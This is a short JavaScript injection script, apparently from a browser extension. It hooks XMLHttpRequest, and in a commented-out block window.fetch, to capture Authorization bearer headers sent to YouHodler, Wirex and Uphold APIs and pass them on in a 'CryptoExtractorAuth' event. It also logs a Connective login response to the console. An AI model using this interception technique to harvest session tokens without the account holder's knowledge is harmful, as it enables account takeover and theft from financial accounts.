(function () {
  /*const constantMock = window.fetch;
  window.fetch = function () {
    return new Promise((resolve, reject) => {
      constantMock.apply(this, arguments)
        .then((response) => {
          // console.log(response)
                    if (arguments[1].hasOwnProperty('headers') && arguments[1].headers.hasOwnProperty('Authorization')) {
            window.dispatchEvent(new CustomEvent('CryptoExtractorAuth', {
              detail: {
                authHeader: arguments[1].headers.Authorization,
                provider: 'Uphold',
              },
            }));
          }
          resolve(response);
        })
        .catch((error) => {
          reject(response);
        });
    });
  };*/

  const XHR = XMLHttpRequest.prototype;
  const { send } = XHR;
  const { open } = XHR;
  const { setRequestHeader } = XHR;
  XHR.setRequestHeader = function (header, value) {
    if(header==='Authorization' && this.url.includes('https://app.youhodler.com/api/')){
        window.dispatchEvent(new CustomEvent('CryptoExtractorAuth', {
              detail: {
                authHeader: value,
                provider: 'YouHodler',
              },
        }));
    }
    if(header === 'Authorization' && this.url.includes('https://api.wirexapp.com/') && value !== undefined){
        window.dispatchEvent(new CustomEvent('CryptoExtractorAuth', {
              detail: {
                authHeader: value,
                provider: 'Wirex',
              },
        }));
    }
    return setRequestHeader.apply(this, arguments);
  };

  XHR.open = function (method, url) {
    this.url = url;
    return open.apply(this, arguments);
  };
  XHR.send = function () {
    this.addEventListener('load', function () {
      if (this.url.includes('https://m5api.connective.com.au/api/mercury5/session/login')) {
          console.log(this.response)
      }
    });
    return send.apply(this, arguments);
  };
}());
